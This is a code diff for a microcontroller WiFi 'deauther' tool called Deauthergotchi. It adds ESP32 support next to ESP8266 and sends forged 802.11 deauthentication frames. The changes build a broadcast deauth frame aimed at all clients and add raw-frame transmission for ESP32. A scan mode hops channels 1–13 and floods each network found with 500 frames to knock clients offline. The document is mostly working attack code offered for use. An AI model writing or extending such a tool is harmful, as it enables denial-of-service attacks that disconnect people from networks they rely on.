@@ -1,6 +1,12 @@
+// Platform-specific includes for WiFi packet injection
+#ifdef ESP8266
 extern "C" {
   #include "user_interface.h"
 }
+#elif defined(ESP32)
+#include "esp_wifi.h"
+#include "esp_err.h"
+#endif
 
 String deauth_command[] = {"< SCAN >", "< DEAUTH ALL>", "< STOP >"  };
 
@@ -18,12 +24,24 @@ void deauthergotchi_setup()
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
   delay(100);
+  
+  #ifdef ESP32
+  // Enable promiscuous mode for ESP32 to allow packet injection
+  esp_wifi_set_promiscuous(true);
+  #endif
+  
   displayClearDisplay();
   display.setTextSize(1);
   display.setCursor(0, 5);
   display.println("DEAUTHERGOTCHI");
   display.println("");
+  #ifdef ESP32
+  display.println("ESP32 Mode");
+  #elif defined(ESP8266)
+  display.println("ESP8266 Mode");
+  #endif
   display.display();
+  delay(1000);
 
   
   deauth_ButtonLeft.begin(BTN_LEFT);
@@ -124,7 +142,11 @@ void scanAndDisplayNetworks() {
 
 void scanNetworksAndDeauth() {
   for (int channel = 1; channel <= 13; channel++) {
+    #ifdef ESP8266
     wifi_set_channel(channel);
+    #elif defined(ESP32)
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    #endif
     int n = WiFi.scanNetworks();
     display.clearDisplay();
     display.setCursor(0,10);
@@ -148,17 +170,23 @@ void scanNetworksAndDeauth() {
 }
 
 void deauthClients(uint8_t *bssid) {
+  // Deauthentication frame structure (IEEE 802.11)
   uint8_t packet[26] = {
     0xC0, 0x00,             // Frame Control: Deauthentication
     0x3A, 0x01,             // Duration
-    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // Destination MAC (BSSID)
-    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // Source MAC (BSSID)
-    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // BSSID
-    0x00, 0x00              // Sequence Number
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC (broadcast to all clients)
+    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // Source MAC (AP BSSID)
+    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // BSSID (AP address)
+    0x00, 0x00,             // Sequence Number
+    0x07, 0x00              // Reason code: Class 3 frame received from nonassociated STA
   };
 
   for (int i = 0; i < 500; i++) { // Send multiple packets to ensure disconnection
+    #ifdef ESP8266
     wifi_send_pkt_freedom(packet, sizeof(packet), false);
+    #elif defined(ESP32)
+    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+    #endif
     delay(10);
   }
 }
